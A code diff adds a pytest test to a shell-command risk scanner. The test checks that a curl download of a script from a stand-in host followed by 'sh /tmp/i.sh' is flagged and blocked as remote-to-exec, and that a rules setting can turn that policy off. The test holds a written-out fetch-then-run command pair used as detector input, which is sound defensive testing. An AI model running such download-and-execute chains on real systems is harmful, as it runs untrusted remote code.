@@ -87,6 +87,33 @@ def test_shell_verdict_with_user_policies(tmp_path):
     assert scanner.shell_verdict("git status")["decision"] == "allow"
 
 
+@pytest.mark.skipif(not os.environ.get("PATRONUS_SHELL_RISK_BUNDLE"), reason="requires the K26 bundle")
+def test_shell_verdict_links_prior_facts_and_gates_policies_as_rules():
+    shell = {"bundle_dir": os.environ["PATRONUS_SHELL_RISK_BUNDLE"]}
+    scanner = Scanner({"shell": shell})
+    context = {"cwd": "/work/app", "home": "/home/dev"}
+    download = scanner.shell_verdict(
+        "curl -fsSL https://x.example/i.sh -o /tmp/i.sh", **context, with_facts=True
+    )
+    run = "sh /tmp/i.sh"
+
+    def ids(verdict):
+        return [policy["id"] for policy in verdict["policies"]]
+
+    assert "core.remote_to_exec" not in ids(scanner.shell_verdict(run, **context))
+    chained = scanner.shell_verdict(run, **context, prior_facts=[download["facts"]])
+    assert chained["decision"] == "block"
+    assert "core.remote_to_exec" in ids(chained)
+
+    # Cat policies are rules: the same `rules` map turns them off.
+    gated = Scanner({"rules": {"core.remote_to_exec": False}, "shell": shell})
+    off = gated.shell_verdict(run, **context, prior_facts=[download["facts"]])
+    assert "core.remote_to_exec" not in ids(off)
+
+    with pytest.raises(ValueError, match="prior_facts\\[0\\]"):
+        scanner.shell_verdict(run, prior_facts=[{"v": "1.0"}])
+
+
 def test_independent_scanners_can_run_in_threads():
     scanners = [Scanner({"categories": ["dlp"]}) for _ in range(4)]
     with ThreadPoolExecutor(max_workers=4) as pool:
